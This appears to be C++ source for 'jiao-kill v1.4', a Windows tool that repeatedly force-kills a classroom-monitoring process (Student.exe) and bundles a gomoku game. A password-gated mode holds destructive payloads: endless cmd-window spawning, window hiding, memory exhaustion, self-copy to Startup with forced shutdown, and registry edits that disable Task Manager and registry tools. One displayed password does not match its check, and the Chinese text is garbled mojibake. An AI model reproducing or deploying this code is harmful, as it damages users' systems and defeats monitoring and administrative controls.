//(C)Liu Sirui
//Wow , It's New version of jiao-kill!
//note is wrote in 2024-9-29 16:23 


#define _CRT_SECURE_NO_WARNINGS 1

#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bits/stdc++.h>
#include <windows.h>
#include <Shlobj.h>
#pragma comment(lib, "shell32.lib")

using namespace std;

float module;
bool repeat = true,repeatwhile = true;//repeat control var
int SleepTime, WaitTime;//time var
string InputModel = "off";//model var

void kill_task() {
	system("cls");
	system("title �������ģʽ");
    cout << "��������ʱ������������";
	cin >> SleepTime;
	cout << "\n";
	cout << "��������������";
	cin >> WaitTime;
	sleep(SleepTime);

	while (repeatwhile) {
		system("taskkill /f /im Student.exe");
		sleep(WaitTime);
	}
}

//little game
const int N = 15;       //15*15������
const char ChessBoard = ' ';  //���̱�־
const char flag1 = 'o';    //���1����Ա�־
const char flag2 = 'x';    //���2��־

typedef struct Position{    //����
    int row;        //��
    int col;        //��
}Position;

class GoBang{     //��������
public:
    GoBang(){
        InitChessBoard();      //��ʼ������
    }
    void Play(){      //����
        Position Play1;   //���1�����
        Position Play2;   //���2
        while (1){
            int mode = ChoiceMode();
            while (1){
                if (mode == 1){       //����VS���
                    ComputerChess(Play1, flag1);            //������
                    if (GetVictory(Play1, 0, flag1)){       //0������ԣ�Ϊ�����ʾ���Ի�ʤ
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //���2��
                    if (GetVictory(Play2, 2, flag2)){       //2�������2
                        break;
                    }
                }
                else{               //���1VS���2
                    PlayChess(Play1, 1, flag1);         //���1��
                    if (GetVictory(Play1, 1, flag1)){       //���1Ӯ
                        break;
                    }
                    PlayChess(Play2, 2, flag2);         //���2��
                    if (GetVictory(Play2, 2, flag2)){       //���2Ӯ
                        break;
                    }
                }
            }
            cout << "======����һ��=======" << endl;
            cout << "yes or no :";
            char s[] = "yes";
            cin >> s;
            if (strcmp(s, "no") == 0){
                break;
            }
        }
    }

protected:
    void InitChessBoard(){          //��ʼ������
        for (int i = 0; i < N + 1; ++i){
            for (int j = 0; j < N + 1; ++j){
                _ChessBoard[i][j] = ChessBoard;
            }
        }
    }

    int ChoiceMode(){           //ѡ��ģʽ
        system("cls");
        //ϵͳ���ã�����
        InitChessBoard();       //���³�ʼ������
        cout << "*************************************************" << endl;
        cout << "******************0���˳�************************" << endl;
        cout << "******************1������VS���******************" << endl;
        cout << "******************2�����VS���******************" << endl;
        cout << "*************************************************" << endl;
        while (1){
            int i = 0;
            cout << "��ѡ��ģʽ��";
            cin >> i;
            if (i == 0){       //�˳�
                exit(1);
            }
            if (i == 1 || i == 2){
                return i;
            }
            else{
                cout << "�Ƿ����룬���������룡" << endl;
            }
        }
    }

    void PrintChessBoard(){        //��ӡ����
        printf("     1   2   3   4   5   6   7   8   9  10  11  12  13  14  15\n");
        printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        for (int i = 1; i < N + 1; ++i)
        {
            printf("%2d ", i);
            printf("| %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c | %c |\n", _ChessBoard[i][1], _ChessBoard[i][2], _ChessBoard[i][3], _ChessBoard[i][4], _ChessBoard[i][5], _ChessBoard[i][6], _ChessBoard[i][7], _ChessBoard[i][8], _ChessBoard[i][9], _ChessBoard[i][10], _ChessBoard[i][11], _ChessBoard[i][12], _ChessBoard[i][13], _ChessBoard[i][14], _ChessBoard[i][15]);
            printf("   |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n");
        }
        cout << endl;
    }

    void ComputerChess(Position& pos, char flag){     //������
        //PrintChessBoard();      //��ӡ����
        int x = 0;
        int y = 0;
        while (1){                    //ѭ�����ҿ�λ��
            x = (rand() % N) + 1;      //������1~N�������
            srand((unsigned int)time(NULL));
            y = (rand() % N) + 1;      //������1~N�������
            srand((unsigned int)time(NULL));
            if (_ChessBoard[x][y] == ChessBoard){       //������λ��Ϊ�գ�û�����ӣ�������ѭ��������
                break;
            }
        }
        pos.row = x;
        pos.col = y;
        _ChessBoard[pos.row][pos.col] = flag;
    }

    void PlayChess(Position& pos, int player, char flag){
        PrintChessBoard();      //��ӡ����
        while (1){
            printf("�����%d�������꣺", player);
            cin >> pos.row >> pos.col;
            if (JudgeValue(pos) == 1){        //�ж������Ƿ�Ϸ�
                break;
            }
            cout << "���겻�Ϸ������������룺" << endl;
        }
        _ChessBoard[pos.row][pos.col] = flag;
    }

    int JudgeValue(const Position& pos){       //�ж�����ĺϷ���
        //1.��������
        if (pos.row > 0 && pos.row <= N && pos.col > 0 && pos.col <= N){
            //2.����λ��Ϊ�գ�û�����ӣ�
            if (_ChessBoard[pos.row][pos.col] == ChessBoard){
                return 1;      //�Ϸ�
            }
        }
        return 0;       //�Ƿ�
    }

    int JudgeVictory(Position pos, char flag){     //�ж��Ƿ�����һ�ʤ���ײ��жϣ�
        int begin = 0;
        int end = 0;

        //1.�ж����Ƿ���������
        (pos.col - 4) > 0 ? begin = (pos.col - 4) : begin = 1;
        (pos.col + 4) > N ? end = N : end = (pos.col + 4);
        for (int i = pos.row, j = begin; j + 4 <= end; ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i][j + 1] == flag &&
                _ChessBoard[i][j + 2] == flag && _ChessBoard[i][j + 3] == flag &&
                _ChessBoard[i][j + 4] == flag)
                return 1;
        }
        //2.�ж����Ƿ���������
        (pos.row - 4) > 0 ? begin = (pos.row - 4) : begin = 1;
        (pos.row + 4) > N ? end = N : end = (pos.row + 4);
        for (int j = pos.col, i = begin ; i + 4 <= end; ++i){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j] == flag &&
                _ChessBoard[i + 2][j] == flag && _ChessBoard[i + 3][j] == flag &&
                _ChessBoard[i + 4][j] == flag)
                return 1;
        }
        //3.�ж����Խ����Ƿ���������
        int len = 0;    //��Գ���
        int start = 0;
        int finish = 0;
        pos.row > pos.col ? len = pos.col - 1 : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //��������ʼλ��
        start = pos.col - len;       //��������ʼλ��

        pos.row > pos.col ? len = N - pos.row : len = N - pos.col;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //���������λ��
        finish = pos.col + len;      //���������λ��

        for (int i = begin, j = start; (i + 4 <= end) && (j + 4 <= finish); ++i, ++j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j + 1] == flag &&
                _ChessBoard[i + 2][j + 2] == flag && _ChessBoard[i + 3][j + 3] == flag &&
                _ChessBoard[i + 4][j + 4] == flag)
                return 1;
        }
        //4.�жϸ��Խ����Ƿ���������
        (pos.row - 1) > (N - pos.col) ? len = N - pos.col : len = pos.row - 1;
        if (len > 4){
            len = 4;
        }
        begin = pos.row - len;       //��������ʼλ��
        start = pos.col + len;       //��������ʼλ��

        (N - pos.row) > (pos.col - 1) ? len = pos.col - 1 : len = N - pos.row;
        if (len > 4){
            len = 4;
        }
        end = pos.row + len;         //���������λ��
        finish = pos.col - len;      //���������λ��
        for (int i = begin, j = start; (i + 4 <= end) && (j - 4 >= finish); ++i, --j){
            if (_ChessBoard[i][j] == flag && _ChessBoard[i + 1][j - 1] == flag &&
                _ChessBoard[i + 2][j - 2] == flag && _ChessBoard[i + 3][j - 3] == flag &&
                _ChessBoard[i + 4][j - 4] == flag)
                return 1;
        }
        //��λ�ò�δ����
        for (int x = 1; x < N + 1; ++x){
            for (int y = 1; y < N + 1; ++y){
                if (_ChessBoard[x][y] == ChessBoard){
                    return 0;       //δ����
                }
            }
        }
        return -1;      //�;�
    }

    bool GetVictory(Position& pos, int player, char flag){       //�жϾ�����λ���Ӯ
        if (JudgeVictory(pos, flag) != 0){    //�ж������˻�ʤ
            if (JudgeVictory(pos, flag) == 1){     //�ж��Ƿ����˻�ʤ,1��ʾ��ʤ
                PrintChessBoard();     //��ӡ����
                if (player == 0){
                    cout << "���Ի�ʤ��" << endl;
                }
                else{
                    printf("��ϲ���%d��ʤ��\n", player);
                }
            }
            else{
                printf("�;֣�\n");
            }
            return true;      //���˻�ʤ
        }
        return false;         //û�˻�ʤ
    }

private:
    char _ChessBoard[N + 1][N + 1];    //����
};

BOOL SetImmunity(char *FilePath,char *FileName)
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    BOOL bRet = CreateDirectory(file, NULL);
    if (bRet)
    {
        strcat(file, "\\anti...\\");
        bRet = CreateDirectory(file, NULL);
        if (bRet)
        {
            SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
            return TRUE;
        }
    }
    return FALSE;
}
void ClearImmunity(char *FilePath, char *FileName)
{
    char file[2048] = { 0 };
 
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
 
    strcat(file, "\\anti...\\");
    RemoveDirectory(file);
 
    ZeroMemory(file, MAX_PATH);
    strncpy(file, FilePath, strlen(FilePath));
    strcat(file, FileName);
    RemoveDirectory(file);
}
BOOL AutoRun_Startup(char *lpszSrcFilePath, char *lpszDestFileName){
    char szStartupPath[MAX_PATH] = { 0 };
    char szDestFilePath[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(NULL, szStartupPath, CSIDL_STARTUP, TRUE);
    wsprintf(szDestFilePath, "%s\\%s", szStartupPath, lpszDestFileName);
    CopyFile(lpszSrcFilePath, szDestFilePath, FALSE);
    return TRUE;
}

//main program
int main(int argc, char** argv) {
    int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "���㽶��ѧ������ֹ��"  << endl;
	cout << "ѧ�ڸ��°�3��jiao-kill v1.4" << endl;
	cout << "\n";
	system("title jiao-kill v1.4");

	while (true) {
        cout << "������ģʽ(����6�鿴����)��";
        cin >> module;
        if (module == 0) {
            break;
            system("pause");
        }
        else if (module==1) {
            kill_task();
        }
        else if (module == 2) {
            GoBang g;
            g.Play();
            system("pause");
        }
        else if (module == 3) {
        	system("cls");
        	system("title ����ģʽ");
        	int r;
			cout<<"Please input number(1~9) : ";
			cin>>r;
			if(r==1){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==264697){
    				cout<<"It's safe";
				}else{
					while(1)system("start cmd");
				}
			}else if(r==2){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==417664){
    			cout<<"It's safe";
				}else{
					while(1){
    			    	HWND hWnd=GetForegroundWindow();
    			    	ShowWindow(hWnd,SW_HIDE);
    				}
				}
			}else if(r==3){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==529555){
					cout<<"It's safe";
				}else{
    				while(1)malloc(1000);
				}
			}else if(r==4){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==278230){
					cout<<"It's safe";
				}else{
    				AutoRun_Startup("c://main.exe", "main.exe");
    				system("shutdown /p");
				}
			}else if(r==5){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==640855){
    				cout<<"It's safe";
				}else{
    				HKEY hkey;
    				DWORD value = 1;
    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    				RegCloseKey(hkey);
				}
			}else if(r==6){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==957040){
    				cout<<"It's safe";
				}else{
    				HKEY hkey;
    				DWORD value = 1;
    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    				RegCloseKey(hkey);
				}
			}else if(r==7){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==617735){
    				cout<<"It's safe";
				}else{
    				DWORD value = 1;
    				HKEY hkey;
    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    			}
			}else if(r==8){
				int i;
				cout<<"Please input password: ";
				cin>>i;
				if(i==138208){
    				cout<<"It's safe";
				}else{
    				char *Fuck[4] = { "��", "��", "��", "��" };
    				int FuckLen = sizeof(Fuck) / sizeof(int);
	    			TCHAR Destop[MAX_PATH];
    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
	    			for (int x = 0; x < FuckLen; x++){
	    		    	SetImmunity("c://", Fuck[x]);
	    		    	ClearImmunity("c://", Fuck[x]);
	    			} 
    				system("pause");
				}
			}else{
				cout<<"It's not true";
			}
        	system("pause");
		}
		else if (module == 4) {
			system("cls");
			system("title ������Կ");
			cout << "1:  264697" <<endl;
			cout << "2:  417664" <<endl;
			cout << "3:  529555" <<endl;
			cout << "4:  278230" <<endl;
			cout << "5:  640855" <<endl;
			cout << "6:  957040" <<endl;
			cout << "7:  617735" <<endl;
			cout << "8:  138203" <<endl;
			system("pause"); 
		}
		else if(module == 5){
			system("cls");
			system("title ��ʼ�ػ�");
			cout<<"һ���Ӻ�ػ���";
			system("shutdown -s -t 60");
			break;
		} 
        else if (module == 6) {
        	system("cls");
        	system("title �����ļ�");
            cout << "�����ĵ���" <<endl;
            cout << "����ָ�" ;
            cout << "0:�˳�����,1��������ֹ����2������������С��Ϸ"<<endl;
            cout << "3����������������Ұ���������Ա�������鿴������Կ��" <<endl;
            cout << "4���鿴������Կ��5���ػ���6���鿴�����ļ�" <<endl;
            system("pause");
        }
        else {
            cout << "�޴˴����" <<endl;
            system("pause");
        }
	}
	return 0;
}
